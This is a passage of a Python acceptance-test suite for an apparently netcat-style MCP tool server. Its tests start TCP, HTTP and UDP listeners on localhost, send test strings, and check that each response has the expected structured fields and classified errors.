    - The response has correct structuredContent shape
    - Success methods return proper data fields
    - Error methods return classified errors (not crashes)

    For stateful methods (listeners/servers), we start them, verify,
    then stop them. For methods that need unreachable targets, we verify
    error classification.
    """

    def _assert_structured_response(self, resp, method_name):
        """Assert response has structuredContent with standard fields."""
        result = resp.get("result", {})
        sc = result.get("structuredContent")
        assert sc is not None, f"{method_name}: missing structuredContent"
        assert "success" in sc, f"{method_name}: structuredContent missing 'success'"
        assert "error_class" in sc, f"{method_name}: structuredContent missing 'error_class'"
        assert "retryable" in sc, f"{method_name}: structuredContent missing 'retryable'"
        assert "suggestions" in sc, f"{method_name}: structuredContent missing 'suggestions'"
        # Should NOT be an unhandled crash
        content_text = ""
        for c in result.get("content", []):
            if c.get("type") == "text":
                content_text += c["text"]
        assert "unexpected keyword argument" not in content_text, (
            f"{method_name}: unhandled keyword argument error"
        )
        assert "Traceback" not in content_text, (
            f"{method_name}: unhandled traceback in response"
        )
        return sc

    # ── TCP methods ──────────────────────────────────────────────

    def test_accept_listen(self, netcat_env):
        """listen: start non-blocking, verify fields, stop."""
        client, loop = netcat_env
        port = _free_port()
        resp = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        sc = self._assert_structured_response(resp, "listen")
        assert sc["success"] is True
        data = parse_tool_output(resp)
        assert "listener_id" in data
        assert data["port"] == port
        assert data["status"] == "listening"
        assert data["mode"] == "non-blocking"
        loop.run_until_complete(client.call("stop", {"id": data["listener_id"]}))

    def test_accept_listener_status(self, netcat_env):
        """listener_status: check a listening listener, verify fields."""
        client, loop = netcat_env
        port = _free_port()
        resp = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        resp2 = loop.run_until_complete(
            client.call("listener_status", {"listener_id": lid})
        )
        sc = self._assert_structured_response(resp2, "listener_status")
        assert sc["success"] is True
        status_data = parse_tool_output(resp2)
        assert status_data["status"] == "listening"
        assert status_data["port"] == port
        assert "created_at" in status_data

        loop.run_until_complete(client.call("stop", {"id": lid}))

    def test_accept_listener_read(self, netcat_env):
        """listener_read: connect, send data, read it, verify fields."""
        client, loop = netcat_env
        port = _free_port()
        resp = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("127.0.0.1", port))
        time.sleep(0.5)
        sock.sendall(b"acceptance-test-data\n")
        time.sleep(0.3)

        resp2 = loop.run_until_complete(
            client.call("listener_read", {"listener_id": lid, "timeout": 5})
        )
        sc = self._assert_structured_response(resp2, "listener_read")
        assert sc["success"] is True
        r_data = parse_tool_output(resp2)
        assert "data" in r_data
        assert "bytes" in r_data
        assert "acceptance-test-data" in r_data["data"]

        sock.close()
        loop.run_until_complete(client.call("stop", {"id": lid}))

    def test_accept_listener_write(self, netcat_env):
        """listener_write: connect, write data via MCP, verify fields."""
        client, loop = netcat_env
        port = _free_port()
        resp = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("127.0.0.1", port))
        sock.settimeout(5.0)
        time.sleep(0.5)

        resp2 = loop.run_until_complete(
            client.call("listener_write", {"listener_id": lid, "data": "accept-cmd\n"})
        )
        sc = self._assert_structured_response(resp2, "listener_write")
        assert sc["success"] is True
        w_data = parse_tool_output(resp2)
        assert "bytes_sent" in w_data
        assert w_data["bytes_sent"] == 11

        received = sock.recv(4096)
        assert received == b"accept-cmd\n"

        sock.close()
        loop.run_until_complete(client.call("stop", {"id": lid}))

    def test_accept_exec(self, netcat_env):
        """exec: one-shot capture, verify fields."""
        client, loop = netcat_env
        port = _free_port()

        def delayed_send():
            time.sleep(1)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect(("127.0.0.1", port))
                s.sendall(b"exec-acceptance\n")
                s.close()
            except ConnectionRefusedError:
                pass

        t = threading.Thread(target=delayed_send, daemon=True)
        t.start()

        resp = loop.run_until_complete(
            client.call("exec", {"port": port, "timeout": 10})
        )
        sc = self._assert_structured_response(resp, "exec")
        assert sc["success"] is True
        data = parse_tool_output(resp)
        assert "output" in data
        assert "remote_ip" in data
        assert "bytes" in data
        assert "exec-acceptance" in data["output"]
        t.join(timeout=5)

    # ── HTTP methods ─────────────────────────────────────────────

    def test_accept_http_listen(self, netcat_env):
        """http_listen: start server, verify response fields, stop."""
        client, loop = netcat_env
        port = _free_port()
        resp = loop.run_until_complete(
            client.call("http_listen", {
                "port": port,
                "files": {"/test.html": "<p>accept</p>"},
            })
        )
        sc = self._assert_structured_response(resp, "http_listen")
        assert sc["success"] is True
        data = parse_tool_output(resp)
        assert "server_id" in data
        assert "url" in data
        assert data["port"] == port
        assert data["tls"] is False
        assert "keepalive_minutes" in data
        assert "/test.html" in data["files"]

        loop.run_until_complete(client.call("stop", {"id": data["server_id"]}))

    def test_accept_http_requests(self, netcat_env):
        """http_requests: make a request, verify captured fields."""
        client, loop = netcat_env
        port = _free_port()
        resp = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        sid = data["server_id"]

        time.sleep(0.5)
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{port}/accept-test?key=val")
        except urllib.error.HTTPError:
            pass
        time.sleep(0.3)

        resp2 = loop.run_until_complete(
            client.call("http_requests", {"server_id": sid})
        )
        sc = self._assert_structured_response(resp2, "http_requests")
        assert sc["success"] is True
        r_data = parse_tool_output(resp2)
        assert "requests" in r_data
        assert "request_count" in r_data
        assert r_data["request_count"] >= 1
        req = r_data["requests"][0]
        assert "timestamp" in req
        assert "method" in req
        assert "path" in req
        assert "query" in req
        assert "headers" in req
        assert "source_ip" in req

        loop.run_until_complete(client.call("stop", {"id": sid}))

    def test_accept_http_file(self, netcat_env):
        """http_file: add a file, verify response fields."""
        client, loop = netcat_env
        port = _free_port()
        resp = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        sid = data["server_id"]

        resp2 = loop.run_until_complete(
            client.call("http_file", {
                "server_id": sid,
                "path": "/accept.js",
                "content": "alert('accept')",
            })
        )
        sc = self._assert_structured_response(resp2, "http_file")
        assert sc["success"] is True
        f_data = parse_tool_output(resp2)
        assert f_data["action"] == "updated"
        assert f_data["path"] == "/accept.js"
        assert "content_type" in f_data
        assert "size" in f_data

        loop.run_until_complete(client.call("stop", {"id": sid}))

    # ── UDP methods ──────────────────────────────────────────────

    def test_accept_udp_listen(self, netcat_env):
        """udp_listen: start listener, verify fields, stop."""
        client, loop = netcat_env
        port = _free_port()
        resp = loop.run_until_complete(
            client.call("udp_listen", {"port": port})
        )
        sc = self._assert_structured_response(resp, "udp_listen")
        assert sc["success"] is True
        data = parse_tool_output(resp)
        assert "listener_id" in data
        assert data["port"] == port
        assert data["status"] == "listening"

        loop.run_until_complete(client.call("stop", {"id": data["listener_id"]}))

    def test_accept_udp_packets(self, netcat_env):
        """udp_packets: send a packet, retrieve it, verify fields."""
        client, loop = netcat_env
        port = _free_port()
        resp = loop.run_until_complete(
            client.call("udp_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(b"accept-udp-pkt", ("127.0.0.1", port))
        sock.close()
        time.sleep(0.5)

        resp2 = loop.run_until_complete(
            client.call("udp_packets", {"listener_id": lid})
        )
        sc = self._assert_structured_response(resp2, "udp_packets")
        assert sc["success"] is True
        p_data = parse_tool_output(resp2)
        assert "packets" in p_data
        assert "packet_count" in p_data
        assert p_data["packet_count"] >= 1
        pkt = p_data["packets"][0]
        assert "timestamp" in pkt
        assert "source_ip" in pkt
        assert "source_port" in pkt
        assert "data" in pkt
        assert "data_hex" in pkt

        loop.run_until_complete(client.call("stop", {"id": lid}))

    def test_accept_udp_send(self, netcat_env):
        """udp_send: send a packet, verify fields."""
        client, loop = netcat_env
        port = _free_port()

        recv_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        recv_sock.bind(("0.0.0.0", port))
        recv_sock.settimeout(5.0)

        try:
            resp = loop.run_until_complete(
                client.call("udp_send", {
                    "host": "127.0.0.1",
                    "port": port,
                    "data": "accept-send",
                })
            )
            sc = self._assert_structured_response(resp, "udp_send")
            assert sc["success"] is True
            s_data = parse_tool_output(resp)
            assert "bytes_sent" in s_data
            assert s_data["bytes_sent"] == len("accept-send")
            assert s_data["host"] == "127.0.0.1"
            assert s_data["port"] == port

            data_recv, _ = recv_sock.recvfrom(4096)
            assert data_recv == b"accept-send"
        finally:
            recv_sock.close()

    # ── Shared methods ───────────────────────────────────────────

    def test_accept_connect_error(self, netcat_env):
        """connect: connect to unreachable IP, verify error classification."""
        client, loop = netcat_env
        resp = loop.run_until_complete(
            client.call("connect", {
                "host": "192.0.2.1",  # TEST-NET, unreachable
                "port": 9999,
                "timeout": 2,
            })
        )
        sc = self._assert_structured_response(resp, "connect")
        assert sc["success"] is False
        assert sc["error_class"] is not None

    def test_accept_connect_success(self, netcat_env):
        """connect: connect to local echo server, verify fields."""
        client, loop = netcat_env
        port = _free_port()
        echo = _TCPEchoServer(port, banner="ACCEPT-BANNER\n")
        echo.start()
        time.sleep(0.3)

        try:
            resp = loop.run_until_complete(
                client.call("connect", {
                    "host": "127.0.0.1",
                    "port": port,
                    "timeout": 5,
                })
            )
            sc = self._assert_structured_response(resp, "connect")
            assert sc["success"] is True
            data = parse_tool_output(resp)
            assert "response" in data
            assert "host" in data
            assert "port" in data
            assert "data_sent" in data
            assert "ACCEPT-BANNER" in data["response"]
        finally:
            echo.stop()

    def test_accept_check_port(self, netcat_env):
        """check_port: check an open port, verify fields."""
        client, loop = netcat_env
        port = _free_port()
        echo = _TCPEchoServer(port, banner="CHECK-ACCEPT\n")
        echo.start()
        time.sleep(0.3)

        try:
            resp = loop.run_until_complete(
                client.call("check_port", {
                    "host": "127.0.0.1",
                    "port": port,
                })
            )
            sc = self._assert_structured_response(resp, "check_port")
            assert sc["success"] is True
            data = parse_tool_output(resp)
            assert "open" in data
            assert data["open"] is True
            assert "banner" in data
            assert "host" in data
            assert "port" in data
        finally:
            echo.stop()

    def test_accept_get_interfaces(self, netcat_env):
        """get_interfaces: verify response fields."""
        client, loop = netcat_env
        resp = loop.run_until_complete(client.call("get_interfaces", {}))
        sc = self._assert_structured_response(resp, "get_interfaces")
        assert sc["success"] is True
        data = parse_tool_output(resp)
        assert "interfaces" in data
        assert len(data["interfaces"]) > 0
        iface = data["interfaces"][0]
        assert "interface" in iface
        assert "addresses" in iface

    def test_accept_list(self, netcat_env):
        """list: verify response fields (may be empty)."""
        client, loop = netcat_env
        resp = loop.run_until_complete(client.call("list", {}))
        sc = self._assert_structured_response(resp, "list")
        assert sc["success"] is True
        data = parse_tool_output(resp)
        assert "listeners" in data
        assert "total" in data
        assert isinstance(data["listeners"], list)
        assert isinstance(data["total"], int)

    def test_accept_stop_tcp(self, netcat_env):
        """stop: stop a TCP listener, verify fields."""
        client, loop = netcat_env
        port = _free_port()
        resp = loop.run_until_complete(
            client.call("listen", {"port": port, "timeout": 0})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        resp2 = loop.run_until_complete(client.call("stop", {"id": lid}))
        sc = self._assert_structured_response(resp2, "stop")
        assert sc["success"] is True
        stop_data = parse_tool_output(resp2)
        assert stop_data["type"] == "tcp"
        assert stop_data["port"] == port
        assert "buffered_data" in stop_data
        assert "id" in stop_data

    def test_accept_stop_http(self, netcat_env):
        """stop: stop an HTTP server, verify fields."""
        client, loop = netcat_env
        port = _free_port()
        resp = loop.run_until_complete(
            client.call("http_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        sid = data["server_id"]

        resp2 = loop.run_until_complete(client.call("stop", {"id": sid}))
        sc = self._assert_structured_response(resp2, "stop (http)")
        assert sc["success"] is True
        stop_data = parse_tool_output(resp2)
        assert stop_data["type"] == "http"
        assert "total_requests" in stop_data
        assert "uptime_seconds" in stop_data

    def test_accept_stop_udp(self, netcat_env):
        """stop: stop a UDP listener, verify fields."""
        client, loop = netcat_env
        port = _free_port()
        resp = loop.run_until_complete(
            client.call("udp_listen", {"port": port})
        )
        data = parse_tool_output(resp)
        lid = data["listener_id"]

        resp2 = loop.run_until_complete(client.call("stop", {"id": lid}))
        sc = self._assert_structured_response(resp2, "stop (udp)")
        assert sc["success"] is True
        stop_data = parse_tool_output(resp2)
        assert stop_data["type"] == "udp"
        assert "total_packets" in stop_data

    def test_accept_stop_error(self, netcat_env):
        """stop: invalid ID returns classified error."""
        client, loop = netcat_env
        resp = loop.run_until_complete(
            client.call("stop", {"id": "tcp_does_not_exist"})
        )
        sc = self._assert_structured_response(resp, "stop (error)")
        assert sc["success"] is False
